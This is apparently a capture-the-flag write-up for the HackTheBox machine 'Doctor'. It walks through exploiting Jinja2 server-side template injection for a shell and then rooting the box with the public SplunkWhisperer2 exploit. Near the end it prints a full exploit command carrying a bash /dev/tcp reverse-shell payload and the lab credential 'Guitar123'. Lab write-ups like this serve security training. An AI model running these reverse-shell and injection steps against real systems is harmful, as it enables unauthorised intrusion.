Doctor is a easy box where the initial foothold is obtained by exploiting the ```Server Side Template Injection```(SSTI) vulnerability. It took me a fair amount of time for me to get how the SSTI could be used in the title of the post. But rooting the box was a piece of cake since I found an interesting script to exploit ```Splunkd```. The final objective is to get the user and the root flag.

Connect to ```Hackthebox``` and let's go.

## <ins>Enumeration</ins>
---
Let's start with the ```nmap``` scan.
<br>
![nmap_scan](/assets/img/hackthebox/doctor/nmap_scan.png)
<br>
The results of the nmap scan showed that the three ports: ```22/ssh```, ```80/http``` and ```8089/splunkd``` are open on the machine.

Leaving the the ```ssh``` and ```splunkd``` services aside, let's start enumerating the ```http``` service. The home page of the http service gives us a valuable piece of information.
<br>
![doctors_htb](/assets/img/hackthebox/doctor/2.png)
<br>
Add ```doctors.htb``` to ```/etc/hosts``` file. ```Sudo``` permission is required to edit the file.
<br>
<pre>
10.10.10.209    doctors.htb
</pre>
<br>
After adding the url, revisit the ```http service``` with the url ```doctors.htb```. If you did everything correct, you should see the login page. Don't bother checking for ```common credentials``` and ```SQLi``` based vulnerabilities. Because I did and wasted a bit of time. Instead create a new account and login with the same account.

After logging in, create a ```New Message```.
<br>

<br>
Creating a post, I searched around for hints and stumbled upon something ineresting in the source page.
<br>
![archive_page](/assets/img/hackthebox/doctor/6.png)
<br>
Going to the ```/archive``` directory, it was just...blank.

At first, I didn't know that the ```title of the post``` and the ```/archive``` page is somewhat linked, so I tried triggering an alert box with XSS but had no luck with it. After figuring out that the title of the post is reflected in the archive page, I tried doing HTML injection which succeeded. Then, I checked for the ```SSTI``` using common payloads from ```PayloadsAlltheThings```. I updated the post to the following.
<br>
![update_post](/assets/img/hackthebox/doctor/4.png)
<br>
And checked the ```/archive``` directory.
<br>
![archive_page](/assets/img/hackthebox/doctor/5.png)
<br>
We can see that the payload ```7+7``` is executed and results in ```14```. This means that the website uses ```Flask``` and ```Jinja2``` to render the website. 

You can learn more about ```SSTI``` vulnerability in the ```Portswiger Academy```.


## <ins>Exploitation</ins>
---
I tried crafting my own payload but in the end I grabbed the ```SSTI``` payload from the ```PayloadsAlltheThings``` page and entered it in the title of the post.
<br>
![payload_ssti](/assets/img/hackthebox/doctor/16.png)
<br>
Here is the link to the [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution). Change the call parameter to ```/bin/bash -i```. And finally post the content.
<br>
![post_content](/assets/img/hackthebox/doctor/7.png)
<br>
Open a ```netcat``` listener in your local machine. And go to the ```/archive``` page to get the reverse shell.
<br>

<br>


## <ins>User flag</ins>
---
I transferred ```linpeas``` into the remote machine and executed it. After going through results I found a lot of ```passwords``` strings. And one of them was actually a password. Also, I found the username ```shaun```.
<br>
![password_file](/assets/img/hackthebox/doctor/9.png)
<br>
I wanted to confirm it just in case...so I cat-ed out the file.
<br>
![password_file_confirm](/assets/img/hackthebox/doctor/10.png)
<br>
<pre> cat /var/log/apache2/backup | grep password</pre>
<br>
Now we can change the user to ```shaun``` with the password we just found. 

Stabilize the shell using ```python3 -c 'import pty;pty.spawn("/bin/bash")'```. In the home directory of the user ```shaun``` we can find the ```user flag```.

## <ins>Root flag</ins>
---
Going back to the ```nmap``` scan results we didn't enumerate the ```8089/splunkd``` port/service.
<br>
![splunkd_ss](/assets/img/hackthebox/doctor/15.png)
<br>
I tried googling publicly available exploits for splunk and this link peeked my interest. Here is the [link](https://github.com/cnotin/SplunkWhisperer2) to the exploit.
<br>
![splunk_link](/assets/img/hackthebox/doctor/12.png)
<br>
I cloned the repository and moved into the ```./SplunkWhisperer2/PySplunkWhisperer2/``` directory. It is an authenticated exploit. For syntax you can just run the python file or you can read the documentation in the github page.
<br>
<pre>python3 PySplunkWhisperer2_remote.py --lhost your-vpn-ip --host 10.10.10.209 --username shaun --password Guitar123 --payload '/bin/bash -c "bash -i >& /dev/tcp/your-vpn-ip/4445 0>&1"'</pre>
<br>
Open a netcat listener in your local machine to get the reverse shell and run the file.
<br>
![splunk_exploit](/assets/img/hackthebox/doctor/13.png)
<br>
The root flag can be found in the /root directory.

Peace out!!!

That's it folks. Happy hacking!!!
